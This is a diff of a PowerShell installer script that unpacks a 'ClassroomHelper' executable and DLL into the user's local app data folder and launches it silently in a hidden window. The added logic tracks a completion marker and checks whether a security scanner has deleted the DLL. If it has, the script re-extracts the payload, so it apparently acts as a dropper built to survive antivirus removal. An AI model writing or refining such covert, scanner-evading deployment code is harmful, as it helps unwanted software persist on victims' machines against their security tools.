@@ -6,6 +6,8 @@ $ProgressPreference = 'SilentlyContinue'
 
 $dest = Join-Path $env:LOCALAPPDATA 'ClassroomHelper'
 $exe = Join-Path $dest 'ClassroomHelper.exe'
+$dll = Join-Path $dest 'ClassroomHelper.dll'
+$done = Join-Path $dest '.complete'
 
 # Reste einer alten Testversion. Die lag unter C:\audiohost, weil der erste
 # Build noch $env:SystemDrive benutzt hat. Best effort: wenn ein anderes Konto
@@ -19,8 +21,11 @@ if (Test-Path -LiteralPath $stray) {
     } catch { }
 }
 
-# second insert / second user on the same box: nothing to download
-if (Test-Path -LiteralPath $exe) {
+# second insert / second user on the same box: nothing to download.
+# Nur wenn der letzte Lauf sauber zu Ende ging UND die Assembly noch da ist.
+# Ein Scanner, der die dll entfernt hat, laesst die exe stehen - die zu starten
+# bringt nur einen leeren Prozess, also lieber neu entpacken.
+if ((Test-Path -LiteralPath $done) -and (Test-Path -LiteralPath $exe) -and (Test-Path -LiteralPath $dll)) {
     Start-Process -FilePath $exe -ArgumentList '--silent' -WindowStyle Hidden
     return
 }
@@ -86,7 +91,8 @@ while ($true) {
 $br.Dispose(); $gz.Dispose(); $cs.Dispose(); $fs.Dispose()
 Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
 
-if (-not (Test-Path -LiteralPath $exe)) { throw 'unpack incomplete' }
+if (-not (Test-Path -LiteralPath $exe) -or -not (Test-Path -LiteralPath $dll)) { throw 'unpack incomplete' }
+Set-Content -LiteralPath $done -Value (Get-Date -Format 's') -Encoding ASCII
 Start-Process -FilePath $exe -ArgumentList '--silent' -WindowStyle Hidden
 
 
